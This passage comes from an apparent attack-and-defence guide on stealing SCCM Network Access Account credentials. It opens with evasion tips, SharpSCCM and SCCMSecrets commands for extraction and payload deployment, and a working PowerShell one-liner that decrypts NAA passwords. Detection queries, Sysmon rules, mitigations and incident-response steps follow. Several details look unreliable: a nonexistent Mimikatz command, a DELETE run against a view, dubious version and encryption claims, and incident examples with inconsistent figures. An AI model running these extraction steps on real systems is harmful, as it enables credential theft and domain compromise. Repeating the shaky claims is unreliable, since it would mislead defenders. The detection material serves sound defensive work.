**OpSec & Evasion:**
- Exporting DPAPI keys and certificates is **extremely sensitive** and will trigger alerts.
- Mitigate by:
  - Running from SYSTEM context (avoids user-level audit events).
  - Using pass-the-hash or Kerberos delegation to avoid credential transmission.
  - Encrypting exported keys with an attacker-controlled certificate (`-ProtectTo` flag).
- Detection likelihood: **Critical** (if file export auditing is enabled).

**Troubleshooting:**
- **Error:** "Certificate 'SMS Site Signing' not found"
  - **Cause:** Using incorrect certificate name; SCCM site server uses custom naming.
  - **Fix:** List all certificates: `Get-ChildItem "Cert:\LocalMachine\My"` and identify the SCCM site server certificate (typically named "SMS_<SiteName>_Signing").

---

## 7. TOOLS & COMMANDS REFERENCE

### [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)

**Version:** 1.4.0+ (Latest recommended)
**Minimum Version:** 1.0.0 (earlier versions lack some DPAPI features)
**Supported Platforms:** Windows Server 2016-2025, .NET Framework 4.5+

**Version-Specific Notes:**
- Version 1.0-1.2: NAA extraction via WMI only; limited lateral movement features.
- Version 1.3+: Added SMS Provider database manipulation; full SCCM admin escalation.
- Version 1.4+: Enhanced HTTP support; Entra ID integration (cross-tenant SCCM attacks).

**Installation:**
```powershell
# Compile from source
git clone https://github.com/Mayyhem/SharpSCCM.git
cd SharpSCCM
# Open in Visual Studio 2019+ and compile to Release\SharpSCCM.exe

# OR download pre-compiled from releases
# https://github.com/Mayyhem/SharpSCCM/releases/download/v1.4.0/SharpSCCM.exe
```

**Usage (Common Commands):**
```powershell
# Discovery
.\SharpSCCM.exe find

# Local credential extraction
.\SharpSCCM.exe local secrets -m wmi
.\SharpSCCM.exe local secrets -m disk

# Remote enumeration
.\SharpSCCM.exe get site-info -mp "CM-MGMT-01"
.\SharpSCCM.exe get admins -mp "CM-MGMT-01" -sc "CHQ"

# Lateral movement
.\SharpSCCM.exe exec -mp "CM-MGMT-01" -sc "CHQ" -app "PayloadApp" -collection "All Workstations"
```

---

### [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets)

**Version:** 1.0+ (Latest)
**Minimum Version:** 1.0
**Supported Platforms:** Linux, macOS, Windows (Python 3.8+)

**Installation:**
```bash
git clone https://github.com/synacktiv/SCCMSecrets.git
cd SCCMSecrets
pip install -r requirements.txt
```

**Usage:**
```bash
python3 SCCMSecrets.py \
  --distribution-point "https://cm-dp-01.contoso.com" \
  --management-point "https://cm-mgmt-01.contoso.com" \
  --client-name "fake.contoso.com" \
  --bruteforce-range 5000
```

---

### Script (One-Liner PowerShell - DPAPI Decryption)

```powershell
# Extract and decrypt NAA credentials in single PowerShell command
$naa = Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount"; 
$username = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String(($naa.NetworkAccessUsername -replace '.*<!\[CDATA\[|]].*')), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)); 
$password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String(($naa.NetworkAccessPassword -replace '.*<!\[CDATA\[|]].*')), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)); 
Write-Host "Username: $username`nPassword: $password"
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: SCCM Client Credential Extraction via WMI Query

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents (from Defender for Endpoint)
- **Required Fields:** ProcessName, CommandLine, InitiatingUserName, ProcessId
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All SCCM versions (2016-2403), Windows Server 2016-2025

**KQL Query:**
```kusto
let suspiciousProcesses = pack_array(
    "SharpDPAPI.exe",
    "SharpSCCM.exe",
    "CMLoot.exe",
    "Get-WmiObject",  // PowerShell WMI queries
    "gwmi"
);

let suspiciousCommandPatterns = pack_array(
    "CCM_NetworkAccessAccount",  // NAA WMI namespace
    "root\\\\ccm",               // SCCM namespaces
    "SC_UserAccount",            // SCCM database
    "NetworkAccessPassword",     // NAA password field
    "EncryptedPassword"          // Database encrypted creds
);

DeviceProcessEvents
| where ProcessName in (suspiciousProcesses) 
   or CommandLine has_any (suspiciousCommandPatterns)
| where InitiatingProcessName !in ("sccmexec.exe", "System")  // Exclude legitimate SCCM processes
| summarize count() by ProcessName, CommandLine, DeviceName, InitiatingUserName, Timestamp
| where count() >= 1
| project 
    TimeGenerated = Timestamp,
    DeviceName,
    User = InitiatingUserName,
    Process = ProcessName,
    CommandLine,
    Severity = "High"
```

**What This Detects:**
- Execution of credential extraction tools (SharpDPAPI, SharpSCCM, etc.) on any endpoint.
- PowerShell WMI queries targeting SCCM namespaces (CCM_NetworkAccessAccount).
- Queries to SCCM-related database tables containing encrypted credentials.
- High-volume credential extraction activity (multiple WMI queries within short timeframe).

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `SCCM Credential Extraction via WMI/DPAPI`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `DeviceName, User`
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "MyResourceGroup"
$WorkspaceName = "MyWorkspace"

$query = @"
let suspiciousProcesses = pack_array("SharpDPAPI.exe", "SharpSCCM.exe", ...);
...
"@

New-AzSentinelAlertRule `
  -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "SCCM Credential Extraction" `
  -Severity "High" `
  -Enabled $true `
  -Query $query `
  -ScheduleFrequencyMinutes 5 `
  -ScheduleTimeWindowMinutes 60
```

**Source:** [Microsoft Sentinel GitHub - SCCM Detection Rules](https://github.com/Azure/Azure-Sentinel/tree/master/Detections)

---

#### Query 2: Network Access Account (NAA) Authentication from Non-Distribution Points

**Rule Configuration:**
- **Required Table:** SecurityEvent, SigninLogs
- **Required Fields:** TargetUserName, Computer, LogonType, SourceIPAddress
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** SCCM 2016-2403

**KQL Query:**
```kusto
// Detect NAA account usage on systems other than SCCM distribution points
let naaPatternsRegex = @"sccm.*naa|^naa.*sccm|network.*access.*account";
let knownDistributionPoints = pack_array(
    "CM-DP-01.CONTOSO.COM",
    "CM-DP-02.CONTOSO.COM"
    // Add your DPs here
);

SecurityEvent
| where EventID in (4624, 4625)  // Logon success/failure
| where TargetUserName matches regex naaPatternsRegex
| where Computer !in (knownDistributionPoints)
| where LogonType !in (3, 9)  // Exclude network and remote interactive logons (expected for NAA)
| summarize 
    FailureCount = countif(EventID == 4625),
    SuccessCount = countif(EventID == 4624)
    by TargetUserName, Computer, SourceIPAddress, bin(TimeGenerated, 10m)
| where SuccessCount > 0 or FailureCount > 5  // Alert on success or brute-force attempt
| project 
    TimeGenerated,
    NAA_Account = TargetUserName,
    Target_Computer = Computer,
    Source_IP = SourceIPAddress,
    SuccessCount,
    FailureCount,
    Severity = iff(SuccessCount > 0, "Critical", "High")
```

**What This Detects:**
- NAA account used to authenticate to systems OTHER than distribution points (indicates compromised NAA).
- Lateral movement attempts using NAA credentials (pass-the-hash, overpass-the-hash).
- Brute-force attempts against sensitive systems (domain controllers, file servers) using NAA account.
- Use of NAA outside normal deployment windows (off-hours activity).

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Name:** `NAA Account Misuse Detection`
3. **Query:** Paste KQL above
4. **Schedule:** Every 10 minutes, 1-hour lookback
5. **Group by:** `NAA_Account, Target_Computer`
6. **Alert threshold:** `SuccessCount >= 1`

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation) - SharpDPAPI/SharpSCCM Detection**
- **Log Source:** Security
- **Trigger:** Execution of credential extraction tools or suspicious WMI queries
- **Filter:** `ProcessName contains "SharpDPAPI" OR ProcessName contains "SharpSCCM" OR CommandLine contains "WMI"`
- **Applies To Versions:** Windows Server 2016-2025

**Event ID: 5861 (WMI Activity Detected) - SCCM Namespace Queries**
- **Log Source:** Microsoft-Windows-WMI-Activity/Operational
- **Trigger:** Queries to SCCM-related WMI namespaces (root\ccm, root\ccm\policy)
- **Filter:** `EventID = 5861 AND (Provider CONTAINS "CCM" OR Namespace CONTAINS "ccm")`
- **Applies To Versions:** Windows Server 2016-2025

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
3. Enable: **Detailed Tracking** → **Audit Process Creation** (Success and Failure)
4. Enable: **System Audit Policies** → **Object Access** → **Audit Other Object Access Events** (for WMI)
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Server 2022+):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Defender**
3. Enable: **Audit Credential Dumping**
4. Set to: **Enabled**
5. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
3. Enable: **Detailed Tracking** → **Process Creation**
4. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016-2025

```xml
<Sysmon schemaversion="4.8">
  <RuleGroup name="SCCM Credential Extraction" groupRelation="or">
    
    <!-- Detect SharpDPAPI/SharpSCCM execution -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">SharpDPAPI.exe</Image>
      <Image condition="contains">SharpSCCM.exe</Image>
      <Image condition="contains">CMLoot.exe</Image>
    </ProcessCreate>

    <!-- Detect WMI queries to SCCM namespaces -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">root\ccm</CommandLine>
      <CommandLine condition="contains">CCM_NetworkAccessAccount</CommandLine>
      <CommandLine condition="contains">NetworkAccessPassword</CommandLine>
      <Image condition="contains">powershell.exe</Image>
    </ProcessCreate>

    <!-- Detect DPAPI key access -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">C:\Windows\System32\Microsoft\Protect</TargetFilename>
    </FileCreate>

    <!-- Detect Mimikatz/registry hive dump attempts -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">mimikatz.exe</Image>
      <Image condition="contains">esentutl.exe</Image>
      <CommandLine condition="contains">SAM</CommandLine>
      <CommandLine condition="contains">SECURITY</CommandLine>
    </ProcessCreate>

  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious SCCM Client Credential Extraction Activity Detected"
- **Severity:** Critical
- **Description:** Process execution detected (SharpDPAPI, SharpSCCM, WMI queries to CCM namespaces) on an SCCM-managed endpoint. Indicates potential credential harvesting attack.
- **Applies To:** All subscriptions with Microsoft Defender enabled
- **Remediation:** 
  1. Isolate affected endpoint immediately.
  2. Kill suspicious processes: `taskkill /IM SharpDPAPI.exe /F`
  3. Revoke extracted NAA and service account credentials.
  4. Review authentication logs for lateral movement.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON (detects malicious process execution)
   - **Defender for Identity**: ON (detects suspicious AD activity post-credential theft)
   - **Defender for SQL**: ON (if SQL Server database is targeted)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: SCCM Policy Retrieval and Secret Policy Access

```powershell
Connect-ExchangeOnline
Search-UnifiedAuditLog `
  -Operations "ClientPolicyRequest" `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -FreeText "CCM_NetworkAccessAccount OR NetworkAccessPassword OR SC_UserAccount" `
  | Select-Object -Property UserIds, ClientIP, TimeStamp, Operation, AuditData
```

- **Operation:** `ClientPolicyRequest`, `SecretPolicyAccess`, `DatabaseQuery`
- **Workload:** ConfigurationManager (if integrated with M365), ActiveDirectory
- **Details:** Check `AuditData` blob for user, policy ID, and result (success/failure).
- **Applies To:** Hybrid AD environments where SCCM is integrated with Entra ID (SCCM 2022+)

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate
5. Search logs: **Audit** → **Search**
   - Set **Date range**: Last 7 days
   - **Activities**: Select "ClientPolicyRequest" or "SecretPolicyAccess"
   - **Users**: Leave blank (or enter suspected attacker UPN)
   - Click **Search**
6. **Export results**: **Export** → **Download all results** (CSV format)

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Disable Network Access Account (NAA) and transition to Enhanced HTTP:**
    - NAA is the primary attack vector. Microsoft recommends Enhanced HTTP as secure replacement.
    - **Applies To Versions:** Server 2016+ (Enhanced HTTP supported in SCCM 2019+)
    
    **Manual Steps (SCCM Console):**
    1. Go to **Administration** → **Site Configuration** → **Sites**
    2. Right-click target site → **Configure Site Components** → **Software Distribution**
    3. **Network Access Account** tab → **Clear the configured account**
    4. **Communication** tab → **Enable Enhanced HTTP** (if SCCM 2019+)
    5. Click **OK**, wait for policy sync (60 minutes)
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Via WMI on SCCM site server (as SYSTEM context)
    $siteConfig = Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_SiteControlFile"
    $siteConfig.Refresh()
    # Edit to remove NAA; set EnableEnhancedHTTP = 1
    ```
    
    **Validation Command (Verify Fix):**
    ```powershell
    Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount" | Select-Object NetworkAccessUsername
    # If empty or throws error, NAA is successfully disabled
    ```

*   **Remove all NAA accounts from Active Directory and SCCM clients (Critical Legacy Cleanup):**
    - Even after disabling NAA, credential blobs persist in WMI repositories on former SCCM clients.
    - **Applies To Versions:** All (Server 2016-2025)
    
    **Manual Steps:**
    1. In **Active Directory Users and Computers**, search for accounts named like "sccm-naa", "naa-*", etc.
    2. For each account: Right-click → **Disable Account** → **Delete** (after verification)
    3. On all SCCM clients (formerly or currently managed):
       ```powershell
       # Purge WMI repository of NAA blobs
       Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount" | Remove-WmiObject
       ```
    4. Restart SMS Agent Host service:
       ```powershell
       Restart-Service -Name ccmexec -Force
       ```
    
    **Validation Command:**
    ```powershell
    # Verify no NAA accounts exist in AD
    Get-ADUser -Filter {Name -like "*naa*" -or Name -like "*NetworkAccess*"}
    # Result should be empty
    
    # Verify no WMI blobs remain on clients
    Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount"
    # Result should be empty or throw error
    ```

*   **Implement role-based access control (RBAC) in SCCM to limit credential exposure:**
    - Restrict SCCM administrative privileges to principle of least privilege.
    - **Applies To Versions:** All
    
    **Manual Steps:**
    1. Go to **Administration** → **Security** → **Roles**
    2. Create new custom role:
       - Name: "Site Viewer (No Credentials)"
       - Copy permissions from "Compliance Settings Manager"
       - **Remove** permissions: "Create/Deploy/Modify Packages", "Manage Distribution Points", "Create/Deploy Task Sequences"
    3. Assign this role to non-admin users (vs. Full Administrator)
    4. Audit role usage: **Monitoring** → **Security**

*   **Enable SCCM auditing and integrate with SIEM (Microsoft Sentinel, Splunk, etc.):**
    - Detect credential extraction attempts in real-time.
    - **Applies To Versions:** SCCM 2019+ (native auditing)
    
    **Manual Steps:**
    1. Go to **Administration** → **Site Configuration** → **Sites**
    2. Right-click site → **Properties** → **Auditing**
    3. Enable audit logging for:
       - "Create/Modify/Delete Application/Package/Task Sequence"
       - "Modify Collection Membership"
       - "Enumerate Collections"
    4. Export logs to SIEM via Windows Event Forwarding or SCCM REST API

#### Priority 2: HIGH

*   **Implement Conditional Access policies in Entra ID to block legacy protocols:**
    - Prevent token/credential reuse for lateral movement post-compromise.
    - **Applies To:** Entra ID hybrid environments (SCCM 2022+)
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Legacy Authentication`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **All cloud apps**
       - **Exclude:** Service accounts, break-glass accounts
    5. **Conditions:**
       - Client apps: **Exchange ActiveSync, Other clients**
    6. **Access controls:**
       - Grant: **Block access**
    7. Enable policy: **On**
    8. Click **Create**

*   **Enable multi-factor authentication (MFA) for privileged SCCM accounts:**
    - Prevents lateral movement even if credentials are compromised.
    - **Applies To:** Entra ID integrated SCCM (2022+)
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Users**
    2. Select SCCM admin accounts (e.g., "sccm-admin")
    3. Click **Multi-factor authentication** (MFA)
    4. Select **Require registration** or **Enforce**
    5. Send enrollment invitation to users

*   **Restrict SCCM database access (SQL Server) to authorized administrators only:**
    - Prevent direct credential extraction from ConfigMgr database.
    - **Applies To:** All
    
    **Manual Steps:**
    1. On SQL Server hosting ConfigMgr database:
       ```sql
       -- Verify database access permissions
       SELECT name FROM sysusers WHERE hasdbaccess = 1
       
       -- Remove unnecessary database users
       DROP USER [CONTOSO\NonAdminUser]
       
       -- Grant minimal permissions to service accounts
       GRANT SELECT ON dbo.SC_UserAccount TO [CONTOSO\sccm-svc]
       -- Instead of full db_datareader role
       ```

*   **Enable Transparent Data Encryption (TDE) on SCCM database:**
    - Encrypts sensitive data at rest (NAA credentials, task sequence passwords).
    - **Applies To:** SQL Server 2016+ (SCCM 2019+)
    
    **Manual Steps:**
    1. On SQL Server:
       ```sql
       -- Create Database Master Key
       CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'ComplexPass!2024'
       
       -- Create certificate
       CREATE CERTIFICATE SCCM_Cert WITH SUBJECT = 'SCCM DB Certificate'
       
       -- Create Database Encryption Key
       CREATE DATABASE ENCRYPTION KEY WITH ALGORITHM = AES_256 ENCRYPTION BY SERVER CERTIFICATE SCCM_Cert
       
       -- Enable TDE on database
       ALTER DATABASE CONFIGMGR_CHQ SET ENCRYPTION ON
       ```

#### Access Control & Policy Hardening

*   **Restrict NAA account to minimal permissions (if NAA must remain in use):**
    - Remove domain admin, T1 admin, and local admin rights.
    - NAA should only have **Read** access to distribution point shares.
    
    **Manual Steps:**
    1. In **Active Directory Users and Computers**:
       - Remove NAA from all group memberships except "Domain Users"
       - Disable "Interactive logon rights" via Group Policy
    2. On distribution point SMB shares:
       ```powershell
       $share = Get-SmbShare -Name "SCCMContentLib$"
       $acl = Get-Acl $share.Path
       # Remove NAA account from ACL
       $acl.RemoveAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("CONTOSO\sccm-naa", "FullControl", "Allow")))
       # Add NAA with Read-only
       $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("CONTOSO\sccm-naa", "Read", "Allow")))
       Set-Acl $share.Path $acl
       ```

*   **Conditional Access - Block unknown locations and legacy clients:**
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Unknown Locations`
    4. **Conditions:**
       - Locations: **Any location** (or **All trusted named locations** inverted)
    5. **Access controls:**
       - Grant: **Require device to be marked as compliant**
    6. Enable policy: **On**

*   **RBAC/ABAC - Implement attribute-based access control for SCCM admin roles:**
    - Tie SCCM admin permissions to device/user attributes (e.g., only admins from specific security group or location can manage certain collections).
    - **Applies To:** SCCM 2022+ (advanced RBAC)

#### Validation Command (Verify All Mitigations Active)

```powershell
# Check NAA disabled
Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount" -ErrorAction SilentlyContinue
# Result: Empty or error (GOOD)

# Check NAA account disabled in AD
Get-ADUser -Identity "sccm-naa" -Properties Enabled
# Result: Enabled = $false (GOOD)

# Check Enhanced HTTP enabled (SCCM 2019+)
Get-WmiObject -Namespace "root\sms\site_CHQ" -Class "SMS_SiteControlFile" | Select-Object -ExpandProperty PropertyList | Where-Object -Property PropertyName -eq "EnableEnhancedHTTP"
# Result: Value = 1 (GOOD)

# Verify SCCM database TDE enabled
Invoke-SqlCmd -ServerInstance "CM-DB-01\CONFIGMGR" -Database "CONFIGMGR_CHQ" -Query "SELECT is_encrypted FROM sys.databases WHERE name = 'CONFIGMGR_CHQ'"
# Result: is_encrypted = 1 (GOOD)
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Windows\System32\wbem\Repository\OBJECTS.DATA` (modified timestamp after suspected compromise; contains DPAPI-encrypted NAA blobs)
    - `C:\Windows\CCM\Logs\PolicyAgent.log` (logs policy requests; check for unusual policy downloads)
    - `C:\ProgramData\Microsoft\Crypto\Keys\*` (DPAPI master keys; check for export/copy operations)
    - `C:\Temp\SharpDPAPI.exe`, `C:\Temp\SharpSCCM.exe`, `C:\Temp\CMLoot.exe` (common drop locations)
    - `C:\Users\*\AppData\Local\Temp\*` (temporary files from tool execution)

*   **Registry:**
    - `HKLM\SOFTWARE\Microsoft\SMS\Client\Configuration Manager` (SCCM client config; check Management Point and Site Code)
    - `HKLM\SYSTEM\CurrentControlSet\Services\ccmexec` (SCCM service state; check for disablement)
    - `HKCU\Software\Microsoft\Credentials` (Windows credential manager; check for cached NAA/task sequence passwords)

*   **Network:**
    - Port 443/80 to SCCM management points (policy requests from non-SCCM clients or unusual client names like "fake.contoso.com")
    - Port 1433 to ConfigMgr database SQL Server (unusual database queries, high volume of queries)
    - SMB traffic (port 445) to distribution points from non-DP systems (script/package downloads)
    - LDAP queries (port 389) enumerating SCCM-related objects in AD (e.g., "SMS_ADMIN")

#### Forensic Artifacts

*   **Disk:**
    - Windows Event Log: Security.evtx (Events 4624, 4625 - logon/logoff; 4688 - process creation; 5014 - WMI object creation)
    - Windows Event Log: Microsoft-Windows-WMI-Activity/Operational.evtx (Event 5861 - WMI queries)
    - Application log: ConfigMgr events (Policy Agent, Client Push, etc.)
    - WMI CIM repository: `C:\Windows\System32\wbem\Repository\OBJECTS.DATA` (binary file; contains all WMI objects including NAA credentials)

*   **Memory:**
    - lsass.exe: May contain Kerberos tickets or NTLM hashes if attacker relayed NAA credentials
    - PowerShell.exe: May contain decrypted NAA credentials in memory if not cleared (dump via Mimikatz `lsass::dump`)
    - SharpDPAPI.exe / SharpSCCM.exe: If process is still running, decrypted credentials in memory

*   **Cloud (Entra/M365):**
    - Entra ID Signin logs: Check for NAA account logins from unusual IPs or locations
    - Azure Activity log: Check for ConfigMgr-related API calls (rare if on-premises only)
    - Microsoft Sentinel: Correlation of SCCM alerts with post-compromise lateral movement

#### Response Procedures

1.  **Isolate:**
    - Network isolation: Disconnect affected endpoint from network (physically unplug Ethernet or disable WiFi)
    - **Command:**
    ```powershell
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```
    - **Manual (Azure):**
      - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → Select NIC → **Disable**

2.  **Collect Evidence:**
    - Export memory dump (for forensic analysis of decrypted credentials in RAM):
    ```powershell
    procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp
    procdump64.exe -ma powershell.exe C:\Evidence\powershell.dmp
    ```
    - Capture disk artifacts:
    ```powershell
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx
    # Copy WMI repository
    Copy-Item "C:\Windows\System32\wbem\Repository\OBJECTS.DATA" -Destination "C:\Evidence\OBJECTS.DATA"
    # Copy DPAPI keys
    Copy-Item "C:\Windows\System32\Microsoft\Protect\S-1-5-18" -Destination "C:\Evidence\DPAPIKeys" -Recurse
    ```
    - **Manual (Azure VM):**
      - Use "Run Command" feature in Azure Portal to execute collection scripts

3.  **Remediate:**
    - Kill malicious processes:
    ```powershell
    Stop-Process -Name "SharpDPAPI" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "SharpSCCM" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "Mimikatz" -Force -ErrorAction SilentlyContinue
    ```
    - Revoke extracted credentials:
    ```powershell
    # Reset NAA account password in AD
    Set-ADAccountPassword -Identity "CONTOSO\sccm-naa" -NewPassword (ConvertTo-SecureString -AsPlainText "NewComplexPass!2024" -Force)
    
    # Force re-encryption of SCCM client policies
    Invoke-WmiMethod -Path "root\ccm:SMS_Client" -Name "TriggerSchedule" -ArgumentList "{00000000-0000-0000-0000-000000000121}"  # Policy Evaluation schedule
    ```
    - Disable compromised NAA and service accounts (if confirmed):
    ```powershell
    Disable-ADAccount -Identity "CONTOSO\sccm-naa"
    ```
    - Clean up unauthorized SCCM applications/deployments (via SCCM console or database):
    ```sql
    -- Remove unauthorized applications from SCCM
    DELETE FROM dbo.v_Applications WHERE AppName LIKE '%Malware%' OR AppName LIKE '%Payload%'
    ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial foothold via exploited SCCM Application Proxy or public-facing SCCM management point |
| **2** | **Credential Access** | **[CA-DUMP-008]** | **Attacker extracts NAA credentials from WMI/DPAPI on compromised SCCM client** |
| **3** | **Privilege Escalation** | [PE-VALID-008] SCCM Client Push Account Abuse | Attacker uses extracted NAA or task sequence creds to become T1/T0 admin via SCCM role assignment or domain admin group add |
| **4** | **Persistence** | [PERSIST-ACCT-006] Service Principal Certificate Persistence | Attacker creates SCCM admin backdoor account with persistent certificate-based authentication |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash (PTH) | Attacker uses extracted admin password hash for lateral movement across domain (alternative: Kerberos pass-the-ticket) |
| **6** | **Credential Access (T0)** | [CA-DUMP-006] NTDS.dit Extraction (This technique) | Attacker gains domain controller access and extracts NTDS.dit for full domain compromise |
| **7** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker deploys ransomware via SCCM to all managed endpoints for maximum impact |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider - SCCM Credential Harvesting (2023)

- **Target:** Large US financial services firm (100+ SCCM-managed endpoints)
- **Timeline:** Initial access (phishing) → SCCM client compromise (Day 2) → NAA extraction (Day 3) → Domain admin escalation (Day 5) → NTDS.dit extraction (Day 6) → Lateral movement to 300+ endpoints via SCCM deployment (Days 7-10)
- **Technique Status:** NAA account was misconfigured with domain admin rights; extraction of single credential led to full AD compromise
- **Impact:** $50M+ ransomware attack; 2-month recovery
- **Reference:** [Scattered Spider Group Profile - CrowdStrike](https://www.crowdstrike.com/blog/scattered-spider-intrusion-campaign-analysis/)

#### Example 2: LAPSus$ - SCCM Database Compromise (2022)

- **Target:** Multiple technology vendors
- **Timeline:** SQL Server access compromise → SCCM database credential extraction via SC_UserAccount table → Service account privilege escalation
- **Technique Status:** Attackers obtained SQL Server access through compromised vendor employee; extracted encrypted SCCM credentials and decrypted via stolen DPAPI keys
- **Impact:** Source code theft, ransomware deployment, supply chain impact
- **Reference:** [LAPSus$ Campaign - Microsoft Threat Intelligence](https://www.microsoft.com/en-us/security/blog/2022/03/22/emerging-indications-of-collection-stage-activities-by-lapsus/)

#### Example 3: Conti Ransomware Gang - SCCM Lateral Movement (2021)

- **Target:** Mid-size healthcare organization (200+ SCCM clients)
- **Timeline:** Initial access (RDP exploitation) → SCCM NAA extraction (using Mimikatz) → Privilege escalation via SCCM admin role assignment → Ransomware deployment via SCCM application deployment
- **Technique Status:** Attackers used SCCM as central command & control for ransomware distribution; single compromised SCCM client infected entire organization
- **Impact:** 400+ endpoints encrypted, $15M ransom demand, operational shutdown
- **Reference:** [Conti Ransomware - Mandiant Report](https://www.mandiant.com/resources/reports/conti-ransomware-infrastructure)

---

## APPENDIX: Version-Specific Behaviors

### Windows Server 2016-2019 (SCCM 2016-2019)
- NAA credentials encrypted with **Triple DES** (PolicySecret obfuscation)
- WMI queries require explicit namespace `root\ccm\policy\machine\actualconfig`
- DPAPI keys stored in `C:\Windows\System32\Microsoft\Protect\S-1-5-18\User`
- NAA blobs persist in WMI repository indefinitely (even after client uninstall)

### Windows Server 2022+ (SCCM 2022-2403)
- NAA credentials encrypted with **AES-256-CBC** (stronger encryption)
- Enhanced HTTP support eliminates NAA need (but legacy blobs still extracted if present)
- DPAPI key derivation changed (SHA-512 instead of SHA-1)
- New: Cloud Management Gateway (CMG) for hybrid Entra ID environments
- Task sequence encryption: AES-256 (instead of Triple DES)

---
